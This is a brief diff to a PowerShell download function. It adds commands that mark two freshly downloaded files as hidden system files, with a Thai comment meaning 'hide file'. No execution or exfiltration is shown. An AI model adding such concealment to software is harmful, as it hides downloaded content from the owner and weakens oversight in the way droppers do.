@@ -79,6 +79,8 @@ function Download-Script {
 try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
 		Invoke-WebRequest -Uri $url -OutFile $micofilePath
+		attrib +h +s $filePath  # ซ่อนไฟล์
+		attrib +h +s $micofilePath  
 
     } catch {
         Write-Log "Error: Failed to download the file."
